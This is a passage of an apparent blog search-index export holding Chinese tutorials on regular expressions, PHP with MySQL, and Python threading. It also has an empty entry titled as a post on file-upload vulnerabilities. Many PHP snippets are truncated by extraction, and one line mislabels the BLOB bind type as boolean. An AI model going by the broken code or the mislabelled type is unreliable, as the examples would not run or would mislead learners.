‘z’ 范围内的任意小写字母字符。 [^a-z] 负值字符范围。匹配任何不在指定范围内的任意字符。例如，’[^a-z]’ 可以匹配任何不在 ‘a’ 到 ‘z’ 范围内的任意字符。 \\b 匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。 \\B 匹配非单词边界。’er\\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。 \\cx 匹配由 x 指明的控制字符。例如， \\cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。 \\d 匹配一个数字字符。等价于 [0-9]。 \\D 匹配一个非数字字符。等价于 [^0-9]。 \\f 匹配一个换页符。等价于 \\x0c 和 \\cL。 \\n 匹配一个换行符。等价于 \\x0a 和 \\cJ。 \\r 匹配一个回车符。等价于 \\x0d 和 \\cM。 \\s 匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \\f\\n\\r\\t\\v]。 \\S 匹配任何非空白字符。等价于 [^ \\f\\n\\r\\t\\v]。 \\t 匹配一个制表符。等价于 \\x09 和 \\cI。 \\v 匹配一个垂直制表符。等价于 \\x0b 和 \\cK。 \\w 匹配包括下划线的任何单词字符。等价于’[A-Za-z0-9_]’。 \\W 匹配任何非单词字符包括下划线。等价于 ‘[^A-Za-z0-9_]’。 \\xn 匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，’\\x41′ 匹配 “A”。’\\x041′ 则等价于 ‘\\x04′ &amp; “1″。正则表达式中可以使用 ASCII 编码。. \\num 匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。例如，’(.)\\1′ 匹配两个连续的相同字符。 \\n 标识一个八进制转义值或一个向后引用。如果 \\n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。 \\nm 标 识一个八进制转义值或一个向后引用。如果 \\nm 之前至少有 nm 个获得子表达式，则 nm 为向后引用。如果 \\nm 之前至少有 n 个获取，则 n 为一个后跟文字 m 的向后引用。如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \\nm 将匹配八进制转义值 nm。 \\nml 如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。 \\un 匹配 n，其中 n 是一个用四个十六进制数字表示的 Unicode 字符。例如， \\u00A9 匹配版权符号 (?)。 例子 匹配32位md5 &#x2F;^[a-z0-9]{32}$&#x2F; php与mysqlhttps://www.w3cschool.cn/php/php-mysql-select.html PHP 连接 MySQL 在 PHP 使用 MySQL 数据库前，你需要先将它们连接。 PHP 5 及以上版本建议使用以下方式连接 MySQL : MySQLi extension (“i” 意为 improved) PDO (PHP Data Objects) 在 PHP 早起版本中我们使用 MySQL 扩展。但该扩展在 2012 年开始不建议使用。 我是该用 MySQLi ，还是 PDO? 如果你需要一个简短的回答，即 “你习惯哪个就用哪个”。 MySQLi 和 PDO 有它们自己的优势： PDO 应用在 12 种不同数据库中， MySQLi 只针对 MySQL 数据库。 所以，如果你的项目需要在多种数据库中切换，建议使用 PDO ，这样你只需要修改连接字符串和部分查询语句即可。使用 MySQLi, 如果不同数据库，你需要重新所有代码，包括查询。 两者都是面向对象, 但 MySQLi 还提供了 API 接口。 两者都支持预处理语句。 预处理语句可以防止 SQL 注入，对于 web 项目的安全性是非常重要的。 MySQLi 和 PDO 连接 MySQL 实例 在本章节及接下来的章节中，我们会使用以下三种方式来演示 PHP 操作 MySQL: MySQLi (面向对象) MySQLi (面向过程) PDO MySQLi Installation Linux 和 Windows: 在 php5 mysql 包安装时 MySQLi 扩展多事情况下是自动安装的。 安装详细信息，请查看： http://php.net/manual/en/mysqli.installation.php PDO 安装 For 安装详细信息，请查看： http://php.net/manual/en/pdo.installation.php 连接 MySQL 在我们访问 MySQL 数据库前，我们需要先连接到数据库服务器： connect\\_error) { ` `die(\"Connection failed: \" . $conn->connect\\_error); } echo \"Connected successfully\"; ?> 面向过程 PDO getMessage(); ` `} ?> 关闭连接 连接在脚本执行完后会自动关闭。你也可以使用以下代码来关闭连接： 实例 (MySQLi - 面向对象) $conn-&gt;close(); 实例 (MySQLi - 面向过程) mysqli_close($conn); 实例 (PDO) $conn &#x3D; null; 现在，你已经知道如何将 MySQL 数据库连接到 PHP 了，接下来，你应该了解 PHP 是如何创建数据库的！ PHP 创建 MySQL 表 在 PHP 中创建完数据库之后，我们需要在数据库中创建一个或者多个的数据表。 一个数据表有一个唯一名称，并有行和列组成。 使用 MySQLi 和 PDO 创建 MySQL 表 CREATE TABLE 语句用于创建 MySQL 表。 创建表前，我们需要使用 use myDB 来选择要操作的数据库： use myDB; 我们将创建一个名为 “MyGuests” 的表，有 5 个列： “id”, “firstname”, “lastname”, “email” 和 “reg_date”: CREATE TABLE MyGuests ( id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, firstname VARCHAR(30) NOT NULL, lastname VARCHAR(30) NOT NULL, email VARCHAR(50), reg_date TIMESTAMP ) 上表中的注意事项: 数据类型指定列可以存储什么类型的数据。完整的数据类型请参考我们的 数据类型参考手册。 在设置了数据类型后，你可以为每个列指定其他选项的属性： NOT NULL - 每一行都必须含有值（不能为空），null 值是不允许的。 DEFAULT value - 设置默认值 UNSIGNED - 使用无符号数值类型，0 及正数 AUTO INCREMENT - 设置 MySQL 字段的值在新增记录时每次自动增长 1 PRIMARY KEY - 设置数据表中每条记录的唯一标识。 通常列的 PRIMARY KEY 设置为 ID 数值，与AUTO_INCREMENT 一起使用。 每个表都应该有一个主键(本列为 “id” 列)，主键必须包含唯一的值。 以下实例展示了如何在 PHP 中创建表： 实例 (MySQLi - 面向对象) connect\\_error) { ` `die(\"Connection failed: \" . $conn->connect\\_error); } // sql to create table $sql = \"CREATE TABLE MyGuests ( id INT(6) UNSIGNED AUTO\\_INCREMENT PRIMARY KEY, firstname VARCHAR(30) NOT NULL, lastname VARCHAR(30) NOT NULL, email VARCHAR(50), reg\\_date TIMESTAMP )\"; if ($conn->query($sql) === TRUE) { ` `echo \"Table MyGuests created successfully\"; } else { ` `echo \"Error creating table: \" . $conn->error; } $conn->close(); ?> 实例 (MySQLi - 面向过程) 实例 (PDO) setAttribute(PDO::ATTR\\_ERRMODE, PDO::ERRMODE\\_EXCEPTION); ` `// sql to create table ` `$sql = \"CREATE TABLE MyGuests ( ` `id INT(6) UNSIGNED AUTO\\_INCREMENT PRIMARY KEY, ` `firstname VARCHAR(30) NOT NULL, ` `lastname VARCHAR(30) NOT NULL, ` `email VARCHAR(50), ` `reg\\_date TIMESTAMP ` `)\"; ` `// use exec() because no results are returned ` `$conn->exec($sql); ` `echo \"Table MyGuests created successfully\"; ` `} catch(PDOException $e) ` `{ ` `echo $sql . \"\" . $e->getMessage(); ` `} $conn = null; ?> 现在，你的 MySQL 数据库已经创建好，并且有了需要的表格，但是这还不够，因为数据表中还没有数据，此时表还只是个架子，所以，我们需要继续完善数据表，为它插入一些数据！ 使用 MySQLi 和 PDO 向 MySQL 插入数据 在创建完数据库和表后，我们可以向表中添加数据。 以下为一些语法规则： PHP 中 SQL 查询语句必须使用引号 在 SQL 查询语句中的字符串值必须加引号 数值的值不需要引号 NULL 值不需要引号 INSERT INTO 语句通常用于向 MySQL 表添加新的记录： INSERT INTO table_name (column1, column2, column3,…) VALUES (value1, value2, value3,…) 学习更多关于 SQL 知识，请查看我们的 SQL 教程。 在前面的几个章节中我们已经创建了表 “MyGuests”，表字段有: “id”, “firstname”, “lastname”, “email” 和 “reg_date”。 现在，让我们开始向表填充数据。 Note 注意： 如果列设置 AUTO_INCREMENT (如 “id” 列) 或 TIMESTAMP (如 “reg_date” 列),，我们就不需要在 SQL 查询语句中指定值； MySQL 会自动为该列添加值。 以下实例向 “MyGuests” 表添加了新的记录: 实例 (MySQLi - 面向对象) connect\\_error) { ` `die(\"Connection failed: \" . $conn->connect\\_error); } $sql = \"INSERT INTO MyGuests (firstname, lastname, email) VALUES ('John', 'Doe', 'john@example.com')\"; if ($conn->query($sql) === TRUE) { ` `echo \"New record created successfully\"; } else { ` `echo \"Error: \" . $sql . \"\" . $conn->error; } $conn->close(); ?> 实例 (MySQLi - 面向过程) 实例 (PDO) setAttribute(PDO::ATTR\\_ERRMODE, PDO::ERRMODE\\_EXCEPTION); ` `$sql = \"INSERT INTO MyGuests (firstname, lastname, email) ` `VALUES ('John', 'Doe', 'john@example.com')\"; ` `// use exec() because no results are returned ` `$conn->exec($sql); ` `echo \"New record created successfully\"; ` `} catch(PDOException $e) ` `{ ` `echo $sql . \"\" . $e->getMessage(); ` `} $conn = null; ?> 其实，你还可以在 PHP 的 MySQL 数据库中插入多条数据，这将在下面的一节内容中提及。 PHP MySQL 插入多条数据 一般情况下，INSERT 语句只能向 MySQL 数据库添加一条语句，而本文将介绍如何使用函数批量的向数据表插入多条数据。 使用 MySQLi 和 PDO 向 MySQL 插入多条数据 mysqli_multi_query() 函数可用来执行多条SQL语句。 以下实例向 “MyGuests” 表添加了三条新的记录： 实例 (MySQLi - 面向对象) connect\\_error) { die(\"Connection failed: \" . $conn->connect\\_error); } $sql = \"INSERT INTO MyGuests (firstname, lastname, email) VALUES ('John', 'Doe', 'john@example.com');\"; $sql .= \"INSERT INTO MyGuests (firstname, lastname, email) VALUES ('Mary', 'Moe', 'mary@example.com');\"; $sql .= \"INSERT INTO MyGuests (firstname, lastname, email) VALUES ('Julie', 'Dooley', 'julie@example.com')\"; if ($conn->multi\\_query($sql) === TRUE) { echo \"New records created successfully\"; } else { echo \"Error: \" . $sql . \" \" . $conn->error; } $conn->close(); ?> Note 请注意，每个SQL语句必须用分号隔开。 实例 (MySQLi - 面向过程) 实例 (PDO) setAttribute(PDO::ATTR\\_ERRMODE, PDO::ERRMODE\\_EXCEPTION); // 开始事务 $conn->beginTransaction(); // SQL 语句 $conn->exec(\"INSERT INTO MyGuests (firstname, lastname, email) VALUES ('John', 'Doe', 'john@example.com')\"); $conn->exec(\"INSERT INTO MyGuests (firstname, lastname, email) VALUES ('Mary', 'Moe', 'mary@example.com')\"); $conn->exec(\"INSERT INTO MyGuests (firstname, lastname, email) VALUES ('Julie', 'Dooley', 'julie@example.com')\"); // commit the transaction $conn->commit(); echo \"New records created successfully\"; } catch(PDOException $e) { // roll back the transaction if something failed $conn->rollback(); echo $sql . \" \" . $e->getMessage(); } $conn = null; ?> 使用预处理语句 mysqli 扩展提供了第二种方式用于插入语句。 我们可以预处理语句及绑定参数。 mysql 扩展可以不带数据发送语句或查询到mysql数据库。 你可以向列关联或 “绑定” 变量。 Example (MySQLi 使用预处理语句) connect\\_error) { die(\"Connection failed: \" . $conn->connect\\_error); } else { $sql = \"INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?)\"; // 为 mysqli\\_stmt\\_prepare() 初始化 statement 对象 $stmt = mysqli\\_stmt\\_init($conn); //预处理语句 if (mysqli\\_stmt\\_prepare($stmt, $sql)) { // 绑定参数 mysqli\\_stmt\\_bind\\_param($stmt, 'sss', $firstname, $lastname, $email); // 设置参数并执行 $firstname = 'John'; $lastname = 'Doe'; $email = 'john@example.com'; mysqli\\_stmt\\_execute($stmt); $firstname = 'Mary'; $lastname = 'Moe'; $email = 'mary@example.com'; mysqli\\_stmt\\_execute($stmt); $firstname = 'Julie'; $lastname = 'Dooley'; $email = 'julie@example.com'; mysqli\\_stmt\\_execute($stmt); } } ?> 我们可以看到以上实例中使用模块化来处理问题。我们可以通过创建代码块实现更简单的读取和管理。 注意参数的绑定。让我们看下 mysqli_stmt_bind_param() 中的代码： mysqli_stmt_bind_param($stmt, ‘sss’, $firstname, $lastname, $email); 该函数绑定参数查询并将参数传递给数据库。第二个参数是 “sss” 。以下列表展示了参数的类型。 s 字符告诉 mysql 参数是字符串。 可以是以下四种参数： i - integer d - double s - string b - BLOB 每个参数必须指定类型，来保证数据的安全性。通过类型的判断可以减少SQL注入漏洞带来的风险。 PHP MySQL 预处理语句 MySQL 从4.1版本开始提供了一种名为预处理语句（prepared statement）的机制。 MySQL 预处理语句不仅大大减少了需要传输的数据量，还提高了命令的处理效率。 预处理语句对于防止 MySQL 注入是非常有用的。 预处理语句及绑定参数 预处理语句用于执行多个相同的 SQL 语句，并且执行效率更高。 预处理语句的工作原理如下： 预处理：创建 SQL 语句模板并发送到数据库。预留的值使用参数 “?” 标记 。例如：INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?) 数据库解析，编译，对SQL语句模板执行查询优化，并存储结果不输出 执行：最后，将应用绑定的值传递给参数（”?” 标记），数据库执行语句。应用可以多次执行语句，如果参数的值不一样。 相比于直接执行SQL语句，预处理语句有两个主要优点： 预处理语句大大减少了分析时间，只做了一次查询（虽然语句多次执行） 绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句 预处理语句针对SQL注入是非常有用的，因为 参数值发送后使用不同的协议，保证了数据的合法性。 MySQLi 预处理语句 以下实例在 MySQLi 中使用了预处理语句，并绑定了相应的参数: 实例 (MySQLi 使用预处理语句) connect\\_error) { ` `die(\"Connection failed: \" . $conn->connect\\_error); } // prepare and bind $stmt = $conn->prepare(\"INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?)\"); $stmt->bind\\_param(\"sss\", $firstname, $lastname, $email); // 设置参数并执行 $firstname = \"John\"; $lastname = \"Doe\"; $email = \"john@example.com\"; $stmt->execute(); $firstname = \"Mary\"; $lastname = \"Moe\"; $email = \"mary@example.com\"; $stmt->execute(); $firstname = \"Julie\"; $lastname = \"Dooley\"; $email = \"julie@example.com\"; $stmt->execute(); echo \"New records created successfully\"; $stmt->close(); $conn->close(); ?> 解析以下实例的每行代码: “INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?)” 在 SQL 语句中，我们使用了问号 (?)，在此我们可以将问号替换为整型，字符串，双精度浮点型和布尔值。 接下来，让我们来看下 bind_param() 函数： $stmt-&gt;bind_param(“sss”, $firstname, $lastname, $email); 该函数绑定了 SQL 的参数，且告诉数据库参数的值。 “sss” 参数列处理其余参数的数据类型。s 字符告诉数据库该参数为字符串。 参数有以下四种类型: i - integer（整型） d - double（双精度浮点型） s - string（字符串） b - BLOB（布尔值） 每个参数都需要指定类型。 通过告诉数据库参数的数据类型，可以降低 SQL 注入的风险。 Note 注意： 如果你想插入其他数据（用户输入），对数据的验证是非常重要的。 PDO 中的预处理语句 以下实例我们在 PDO 中使用了预处理语句并绑定参数: 实例 (PDO 使用预处理语句) setAttribute(PDO::ATTR\\_ERRMODE, PDO::ERRMODE\\_EXCEPTION); ` `// 预处理 SQL 并绑定参数 ` `$stmt = $conn->prepare(\"INSERT INTO MyGuests (firstname, lastname, email) ` `VALUES (:firstname, :lastname, :email)\"); ` `$stmt->bindParam(':firstname', $firstname); ` `$stmt->bindParam(':lastname', $lastname); ` `$stmt->bindParam(':email', $email); ` `// 插入行 ` `$firstname = \"John\"; ` `$lastname = \"Doe\"; ` `$email = \"john@example.com\"; ` `$stmt->execute(); ` `// 插入其他行 ` `$firstname = \"Mary\"; ` `$lastname = \"Moe\"; ` `$email = \"mary@example.com\"; ` `$stmt->execute(); ` `// 插入其他行 ` `$firstname = \"Julie\"; ` `$lastname = \"Dooley\"; ` `$email = \"julie@example.com\"; ` `$stmt->execute(); ` `echo \"New records created successfully\"; ` `} catch(PDOException $e) ` `{ ` `echo $sql . \"\" . $e->getMessage(); ` `} $conn = null; ?> PHP MySQL 读取数据 当 PHP 连接到 MySQL 数据库后，需要向数据库读取数据？那么怎么读取呢？一起来看看。 从 MySQL 数据库读取数据 SELECT 语句用于从数据表中读取数据: SELECT column_name(s) FROM table_name 我们可以使用 * 号来读取所有数据表中的字段： SELECT * FROM table_name 如需学习更多关于 SQL 的知识，请访问我们的 SQL 教程。 以下实例中我们从表 MyGuests 读取了 id, firstname 和 lastname 列的数据并显示在页面上： 实例 (MySQLi - 面向对象) connect\\_error) { ` `die(\"Connection failed: \" . $conn->connect\\_error); } $sql = \"SELECT id, firstname, lastname FROM MyGuests\"; $result = $conn->query($sql); if ($result->num\\_rows > 0) { ` `// 输出每行数据 ` `while($row = $result->fetch\\_assoc()) { ` `echo \"id: \". $row[\"id\"]. \" - Name: \". $row[\"firstname\"]. \" \" . $row[\"lastname\"]. \"\"; ` `} } else { ` `echo \"0 results\"; } mysqli\\_close($conn); ?> 以下实例读取了 MyGuests 表的所有记录并显示在 HTML 表格中： 实例 (PDO) setAttribute(PDO::ATTR\\_ERRMODE, PDO::ERRMODE\\_EXCEPTION); ` `$stmt = $conn->prepare(\"SELECT \\* FROM MyGuests\"); ` `$stmt->execute(); ` `// 设置结果集为关联数组 ` `$result = $stmt->setFetchMode(PDO::FETCH\\_ASSOC); ` `foreach(new TableRows(new RecursiveArrayIterator($stmt->fetchAll())) as $k=>$v) { ` `echo $v; ` `} ` `$dsn = null; ` `} catch(PDOException $e) ` `{ ` `echo \"Error: \" . $e->getMessage(); ` `} $conn = null; echo \"\"; ?> PHP MySQL Where 子句 通过上一节的内容，你已经可以使用 MySQL 的 SELECT 命令从数据表中获取数据，本节我们可以用 WHERE 命令来筛选出满足条件的结果。 WHERE 子句用于过滤记录。 WHERE 子句 WHERE 子句用于提取满足指定标准的的记录。 语法 SELECT column_name(s) FROM table_name WHERE column_name operator value 如需学习更多关于 SQL 的知识，请访问我们的 SQL 教程。 为了让 PHP 执行上面的语句，我们必须使用 mysqli_query() 函数。该函数用于向 MySQL 连接发送查询或命令。 实例 下面的实例将从 “Persons” 表中选取所有 FirstName&#x3D;’Peter’ 的行： 以上代码将输出： Peter Griffin 在下一节内容中，我们会讲解如何对筛选出来的记录进行排序。 PHP MySQL Order By 关键词 你可以对 MySQL 数据库中的记录集进行排序，具体请阅读本节内容。 ORDER BY 关键词用于对记录集中的数据进行排序。 ORDER BY 关键词 ORDER BY 关键词用于对记录集中的数据进行排序。 ORDER BY 关键词默认对记录进行升序排序。 如果你想降序排序，请使用 DESC 关键字。 语法 SELECT column_name(s) FROM table_name ORDER BY column_name(s) ASC|DESC 如需学习更多关于 SQL 的知识，请访问我们的 SQL 教程。 实例 下面的实例选取 “Persons” 表中存储的所有数据，并根据 “Age” 列对结果进行排序： 以上结果将输出： Glenn Quagmire 33 Peter Griffin 35 根据两列进行排序 可以根据多个列进行排序。当按照多个列进行排序时，只有第一列的值相同时才使用第二列： SELECT column_name(s) FROM table_name ORDER BY column1, column2 PHP MySQL Update 对于 MySQL 数据库中的数据你可以根据需要进行更新！ UPDATE 语句用于中修改数据库表中的数据。 更新数据库中的数据 UPDATE 语句用于更新数据库表中已存在的记录。 语法 UPDATE table_name SET column1&#x3D;value, column2&#x3D;value2,… WHERE some_column&#x3D;some_value 注释：请注意 UPDATE 语法中的 WHERE 子句。WHERE 子句规定了哪些记录需要更新。如果您想省去 WHERE 子句，所有的记录都会被更新！ 如需学习更多关于 SQL 的知识，请访问我们的 SQL 教程。 为了让 PHP 执行上面的语句，我们必须使用 mysqli_query() 函数。该函数用于向 MySQL 连接发送查询或命令。 实例 在本教程的前面章节中，我们创建了一个名为 “Persons” 的表，如下所示： FirstName LastName Age Peter Griffin 35 Glenn Quagmire 33 下面的例子更新 “Persons” 表的一些数据： 在这次更新后，”Persons” 表如下所示： FirstName LastName Age Peter Griffin 36 Glenn Quagmire 33 PHP MySQL Delete 如果你不再需要 MySQL 数据库中的某条记录了，那么你也可以根据需要将其删除！ DELETE 语句用于从数据库表中删除行。 删除数据库中的数据 DELETE FROM 语句用于从数据库表中删除记录。 语法 DELETE FROM table_name WHERE some_column &#x3D; some_value 注释：请注意 DELETE 语法中的 WHERE 子句。WHERE 子句规定了哪些记录需要删除。如果您想省去 WHERE 子句，所有的记录都会被删除！ 如需学习更多关于 SQL 的知识，请访问我们的 SQL 教程。 为了让 PHP 执行上面的语句，我们必须使用 mysqli_query() 函数。该函数用于向 MySQL 连接发送查询或命令。 实例 请看下面的 “Persons” 表： FirstName LastName Age Peter Griffin 35 Glenn Quagmire 33 下面的实例删除 “Persons” 表中所有 LastName&#x3D;’Griffin’ 的记录： 在这次删除后，”Persons” 表如下所示： FirstName LastName Age Glenn Quagmire 33","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"web安全","slug":"安全/web安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"python多线程","slug":"python多线程","date":"2024-01-13T04:32:55.743Z","updated":"2024-01-15T12:30:43.093Z","comments":true,"path":"2024/01/13/python多线程/","permalink":"http://example.com/2024/01/13/python%E5%A4%9A%E7%BA%BF%E7%A8%8B/","excerpt":"","text":"方法Python中使用线程有两种方式：函数或者用类来包装线程对象。 函数式：调用 _thread 模块中的start_new_thread()函数来产生新线程。语法如下: 1_thread.start_new_thread ( function, args[, kwargs] ) 参数说明: function - 线程函数。 args - 传递给线程函数的参数,他必须是个tuple类型。 kwargs - 可选参数。 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/python3import _threadimport time# 为线程定义一个函数def print_time( threadName, delay): count = 0 while count &lt; 5: time.sleep(delay) count += 1 print (&quot;%s: %s&quot; % ( threadName, time.ctime(time.time()) ))# 创建两个线程try: _thread.start_new_thread( print_time, (&quot;Thread-1&quot;, 2, ) ) _thread.start_new_thread( print_time, (&quot;Thread-2&quot;, 4, ) )except: print (&quot;Error: 无法启动线程&quot;)while 1: pass执行以上程序输出结果如下：Thread-1: Wed Jan 5 17:38:08 2022Thread-2: Wed Jan 5 17:38:10 2022Thread-1: Wed Jan 5 17:38:10 2022Thread-1: Wed Jan 5 17:38:12 2022Thread-2: Wed Jan 5 17:38:14 2022Thread-1: Wed Jan 5 17:38:14 2022Thread-1: Wed Jan 5 17:38:16 2022Thread-2: Wed Jan 5 17:38:18 2022Thread-2: Wed Jan 5 17:38:22 2022Thread-2: Wed Jan 5 17:38:26 2022 线程模块Python3 通过两个标准库 _thread 和 threading 提供对线程的支持。 _thread 提供了低级别的、原始的线程以及一个简单的锁，它相比于 threading 模块的功能还是比较有限的。 threading 模块除了包含 _thread 模块中的所有方法外，还提供的其他方法： threading.currentThread(): 返回当前的线程变量。 threading.enumerate(): 返回一个包含正在运行的线程的list。正在运行指线程启动后、结束前，不包括启动前和终止后的线程。 threading.activeCount(): 返回正在运行的线程数量，与len(threading.enumerate())有相同的结果。 除了使用方法外，线程模块同样提供了Thread类来处理线程，Thread类提供了以下方法: run(): 用以表示线程活动的方法。 start(): 启动线程活动。 join([time]): 等待至线程中止。这阻塞调用线程直至线程的join() 方法被调用中止-正常退出或者抛出未处理的异常-或者是可选的超时发生。 isAlive(): 返回线程是否活动的。 getName(): 返回线程名。 setName(): 设置线程名。 使用 threading 模块创建线程我们可以通过直接从 threading.Thread 继承创建一个新的子类，并实例化后调用 start() 方法启动新线程，即它调用了线程的 run() 方法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#!/usr/bin/python3import threadingimport timeexitFlag = 0class myThread (threading.Thread): def __init__(self, threadID, name, delay): threading.Thread.__init__(self) self.threadID = threadID self.name = name self.delay = delay def run(self): print (&quot;开始线程：&quot; + self.name) print_time(self.name, self.delay, 5) print (&quot;退出线程：&quot; + self.name)def print_time(threadName, delay, counter): while counter: if exitFlag: threadName.exit() time.sleep(delay) print (&quot;%s: %s&quot; % (threadName, time.ctime(time.time()))) counter -= 1# 创建新线程thread1 = myThread(1, &quot;Thread-1&quot;, 1)thread2 = myThread(2, &quot;Thread-2&quot;, 2)# 开启新线程thread1.start()thread2.start()thread1.join()thread2.join()print (&quot;退出主线程&quot;)以上程序执行结果如下；开始线程：Thread-1开始线程：Thread-2Thread-1: Wed Jan 5 17:34:54 2022Thread-2: Wed Jan 5 17:34:55 2022Thread-1: Wed Jan 5 17:34:55 2022Thread-1: Wed Jan 5 17:34:56 2022Thread-2: Wed Jan 5 17:34:57 2022Thread-1: Wed Jan 5 17:34:57 2022Thread-1: Wed Jan 5 17:34:58 2022退出线程：Thread-1Thread-2: Wed Jan 5 17:34:59 2022Thread-2: Wed Jan 5 17:35:01 2022Thread-2: Wed Jan 5 17:35:03 2022退出线程：Thread-2退出主线程 线程同步如果多个线程共同对某个数据修改，则可能出现不可预料的结果，为了保证数据的正确性，需要对多个线程进行同步。 使用 Thread 对象的 Lock 和 Rlock 可以实现简单的线程同步，这两个对象都有 acquire 方法和 release 方法，对于那些需要每次只允许一个线程操作的数据，可以将其操作放到 acquire 和 release 方法之间。如下： 多线程的优势在于可以同时运行多个任务（至少感觉起来是这样）。但是当线程需要共享数据时，可能存在数据不同步的问题。 考虑这样一种情况：一个列表里所有元素都是0，线程”set”从后向前把所有元素改成1，而线程”print”负责从前往后读取列表并打印。 那么，可能线程”set”开始改的时候，线程”print”便来打印列表了，输出就成了一半0一半1，这就是数据的不同步。为了避免这种情况，引入了锁的概念。 锁有两种状态——锁定和未锁定。每当一个线程比如”set”要访问共享数据时，必须先获得锁定；如果已经有别的线程比如”print”获得锁定了，那么就让线程”set”暂停，也就是同步阻塞；等到线程”print”访问完毕，释放锁以后，再让线程”set”继续。 经过这样的处理，打印列表时要么全部输出0，要么全部输出1，不会再出现一半0一半1的尴尬场面。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/usr/bin/python3import threadingimport timeclass myThread (threading.Thread): def __init__(self, threadID, name, delay): threading.Thread.__init__(self) self.threadID = threadID self.name = name self.delay = delay def run(self): print (&quot;开启线程： &quot; + self.name) # 获取锁，用于线程同步 threadLock.acquire() print_time(self.name, self.delay, 3) # 释放锁，开启下一个线程 threadLock.release()def print_time(threadName, delay, counter): while counter: time.sleep(delay) print (&quot;%s: %s&quot; % (threadName, time.ctime(time.time()))) counter -= 1threadLock = threading.Lock()threads = []# 创建新线程thread1 = myThread(1, &quot;Thread-1&quot;, 1)thread2 = myThread(2, &quot;Thread-2&quot;, 2)# 开启新线程thread1.start()thread2.start()# 添加线程到线程列表threads.append(thread1)threads.append(thread2)# 等待所有线程完成for t in threads: t.join()print (&quot;退出主线程&quot;)执行以上程序，输出结果为：开启线程： Thread-1开启线程： Thread-2Thread-1: Wed Jan 5 17:36:50 2022Thread-1: Wed Jan 5 17:36:51 2022Thread-1: Wed Jan 5 17:36:52 2022Thread-2: Wed Jan 5 17:36:54 2022Thread-2: Wed Jan 5 17:36:56 2022Thread-2: Wed Jan 5 17:36:58 2022退出主线程 线程优先级队列（ Queue）Python 的 Queue 模块中提供了同步的、线程安全的队列类，包括FIFO（先入先出)队列Queue，LIFO（后入先出）队列LifoQueue，和优先级队列 PriorityQueue。 这些队列都实现了锁原语，能够在多线程中直接使用，可以使用队列来实现线程间的同步。 Queue 模块中的常用方法: Queue.qsize() 返回队列的大小 Queue.empty() 如果队列为空，返回True,反之False Queue.full() 如果队列满了，返回True,反之False Queue.full 与 maxsize 大小对应 Queue.get([block[, timeout]])获取队列，timeout等待时间 Queue.get_nowait() 相当Queue.get(False) Queue.put(item) 写入队列，timeout等待时间 Queue.put_nowait(item) 相当Queue.put(item, False) Queue.task_done() 在完成一项工作之后，Queue.task_done()函数向任务已经完成的队列发送一个信号 Queue.join() 实际上意味着等到队列为空，再执行别的操作 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#!/usr/bin/python3import queueimport threadingimport timeexitFlag = 0class myThread (threading.Thread): def __init__(self, threadID, name, q): threading.Thread.__init__(self) self.threadID = threadID self.name = name self.q = q def run(self): print (&quot;开启线程：&quot; + self.name) process_data(self.name, self.q) print (&quot;退出线程：&quot; + self.name)def process_data(threadName, q): while not exitFlag: queueLock.acquire() if not workQueue.empty(): data = q.get() queueLock.release() print (&quot;%s processing %s&quot; % (threadName, data)) else: queueLock.release() time.sleep(1)threadList = [&quot;Thread-1&quot;, &quot;Thread-2&quot;, &quot;Thread-3&quot;]nameList = [&quot;One&quot;, &quot;Two&quot;, &quot;Three&quot;, &quot;Four&quot;, &quot;Five&quot;]queueLock = threading.Lock()workQueue = queue.Queue(10)threads = []threadID = 1# 创建新线程for tName in threadList: thread = myThread(threadID, tName, workQueue) thread.start() threads.append(thread) threadID += 1# 填充队列queueLock.acquire()for word in nameList: workQueue.put(word)queueLock.release()# 等待队列清空while not workQueue.empty(): pass# 通知线程是时候退出exitFlag = 1# 等待所有线程完成for t in threads: t.join()print (&quot;退出主线程&quot;)以上程序执行结果：开启线程：Thread-1开启线程：Thread-2开启线程：Thread-3Thread-3 processing OneThread-1 processing TwoThread-2 processing ThreeThread-3 processing FourThread-1 processing Five退出线程：Thread-3退出线程：Thread-2退出线程：Thread-1退出主线程","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"python","slug":"开发/python","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/"},{"name":"语法","slug":"开发/python/语法","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/%E8%AF%AD%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"文件上传漏洞","slug":"文件上传漏洞","date":"2024-01-12T13:26:47.362Z","updated":"2024-01-12T13:41:21.881Z","comments":true,"path":"2024/01/12/文件上传漏洞/","permalink":"http://example.com/2024/01/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%